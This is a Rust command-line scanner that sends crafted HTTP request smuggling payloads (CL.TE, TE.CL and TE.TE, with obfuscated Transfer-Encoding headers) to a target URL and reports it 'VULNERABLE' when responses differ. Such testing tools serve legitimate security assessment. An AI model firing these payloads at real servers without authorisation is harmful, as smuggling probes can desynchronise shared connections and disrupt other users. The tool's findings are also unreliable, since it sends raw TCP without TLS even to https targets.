use clap::Parser;
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use std::error::Error;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use url::Url;

/// HTTP Request Smuggling tester
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Target URL
    #[arg(required = true)]
    url: String,

    /// Custom method for the attack request
    #[arg(short, long, default_value = "POST")]
    method: String,

    /// Socket timeout in seconds
    #[arg(short, long, default_value_t = 10)]
    timeout: u64,

    /// Verbose mode
    #[arg(short, long, action = clap::ArgAction::SetTrue)]
    verbose: bool,
}

/// Sends a raw HTTP request and returns the response and duration.
async fn send_request(
    host: &str,
    port: u16,
    request: &str,
    timeout: u64,
    verbose: bool,
) -> Result<(String, Duration), Box<dyn Error>> {
    if verbose {
        println!("\n{}", "--- REQUEST ---".bold().blue());
        println!("{}", request.cyan());
    }

    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(addr).await?;
    
    let start = Instant::now();
    stream.write_all(request.as_bytes()).await?;

    let mut buf = Vec::new();
    tokio::time::timeout(Duration::from_secs(timeout), stream.read_to_end(&mut buf)).await??;
    let duration = start.elapsed();
    
    let response_str = String::from_utf8_lossy(&buf).to_string();
    
    if verbose {
        println!("\n{}", "--- RESPONSE ---".bold().blue());
        println!("{}", response_str.white());
    }

    Ok((response_str, duration))
}

/// Runs a set of attack requests for a given check type.
async fn run_checks_for_type(
    pb: &ProgressBar,
    check_name: &str,
    host: &str,
    port: u16,
    path: &str,
    attack_requests: Vec<String>,
    timeout: u64,
    verbose: bool,
) -> Result<(), Box<dyn Error>> {
    if !verbose {
        pb.set_message(format!("Checking for {}...", check_name));
    } else {
        println!("\n{}", format!("[!] Checking for {} vulnerability", check_name).bold());
    }
    
    let (normal_response, normal_duration) = send_request(host, port, &format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        path, host
    ), timeout, verbose).await?;
    let normal_status = normal_response.lines().next().unwrap_or("").to_string();

    let mut vulnerable = false;
    for (i, attack_request) in attack_requests.iter().enumerate() {
        match send_request(host, port, attack_request, timeout, verbose).await {
            Ok((attack_response, attack_duration)) => {
                let attack_status = attack_response.lines().next().unwrap_or("");
                if attack_response.len() != normal_response.len() || attack_status != normal_status {
                    vulnerable = true;
                    let result_text = format!("[!] {} Result:", check_name);
                    let vulnerable_text = "[!!!] VULNERABLE".red().bold();
                    if verbose {
                        println!("\n{}", result_text.bold());
                        println!("  {}", vulnerable_text);
                        println!("  {} Payload index: {}", "[+] ".green(), i);
                        println!("  {} {} (took {:.2?})", "[+] ".green(), format!("Normal response status: {}", normal_status), normal_duration);
                        println!("  {} {} (took {:.2?})", "[+] ".green(), format!("Attack response status: {}", attack_status), attack_duration);
                    } else {
                        pb.println(format!("\n{}", result_text.bold()));
                        pb.println(format!("  {}", vulnerable_text));
                        pb.println(format!("  {} Payload index: {}", "[+] ".green(), i));
                        pb.println(format!("  {} {} (took {:.2?})", "[+] ".green(), format!("Normal response status: {}", normal_status), normal_duration));
                        pb.println(format!("  {} {} (took {:.2?})", "[+] ".green(), format!("Attack response status: {}", attack_status), attack_duration));
                    }
                    break;
                }
            }
            Err(e) => {
                 let error_text = format!("\n{} Error during {} attack request (payload {}): {}", "[!] ".yellow(), check_name, i, e);
                 if verbose { println!("{}", error_text); } else { pb.println(error_text); }
            }
        }
    }

    if !vulnerable {
        let result_text = format!("[!] {} Result:", check_name);
        let not_vulnerable_text = "[+] Not Vulnerable".green();
        if verbose {
            println!("\n{}", result_text.bold());
            println!("  {}", not_vulnerable_text);
        } else {
            pb.println(format!("\n{}", result_text.bold()));
            pb.println(format!("  {}", not_vulnerable_text));
        }
    }

    Ok(())
}

fn get_cl_te_payloads(path: &str, host: &str, method: &str) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
    ];
    let mut payloads = Vec::new();
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, te_header
        ));
    }
    payloads
}

fn get_te_cl_payloads(path: &str, host: &str, method: &str) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
    ];
    let mut payloads = Vec::new();
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, te_header
        ));
    }
    payloads
}

fn get_te_te_payloads(path: &str, host: &str, method: &str) -> Vec<String> {
    vec![format!(
        "{} {} HTTP/1.1\r\n\
        Host: {}\r\n\
        Content-Length: 4\r\n\
        Transfer-Encoding: chunked\r\n\
        Transfer-Encoding: x-custom\r\n\
        \r\n\
        1\r\n\
        A\r\n\
        0\r\n\
        \r\n",
        method, path, host
    )]
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();

    let url = Url::parse(&cli.url)?;
    let host = url.host_str().ok_or("Invalid host")?;
    let port = url.port_or_known_default().ok_or("Invalid port")?;
    let path = url.path();
    let method = &cli.method;
    let timeout = cli.timeout;
    let verbose = cli.verbose;

    println!();
    println!("{} {}", "Target:".bold(), host.cyan());
    println!("{}   {}", "Method:".bold(), method.cyan());
    println!("{} {}", "Timeout:".bold(), format!("{}s", timeout).cyan());
    if verbose {
        println!("{} {}", "Verbose:".bold(), "Enabled".cyan());
    }
    println!();

    let pb = ProgressBar::new_spinner();
    if !verbose {
        pb.enable_steady_tick(Duration::from_millis(120));
        pb.set_style(
            ProgressStyle::with_template("{spinner:.blue} {msg}")
                .unwrap()
                .tick_strings(&[
                    "▸▹▹▹▹",
                    "▹▸▹▹▹",
                    "▹▹▸▹▹",
                    "▹▹▹▸▹",
                    "▹▹▹▹▸",
                ]),
        );
    } else {
        pb.finish_and_clear();
    }

    let cl_te_payloads = get_cl_te_payloads(path, host, method);
    run_checks_for_type(&pb, "CL.TE", host, port, path, cl_te_payloads, timeout, verbose).await?;
    pb.inc(1);

    let te_cl_payloads = get_te_cl_payloads(path, host, method);
    run_checks_for_type(&pb, "TE.CL", host, port, path, te_cl_payloads, timeout, verbose).await?;
    pb.inc(1);

    let te_te_payloads = get_te_te_payloads(path, host, method);
    run_checks_for_type(&pb, "TE.TE", host, port, path, te_te_payloads, timeout, verbose).await?;
    pb.inc(1);

    if !verbose {
        pb.finish_with_message(format!("{} {}", "✔".green(), "Checks finished!".bold()));
    } else {
        println!("\n{}", format!("✔ Checks finished!").bold().green());
    }
    Ok(())
}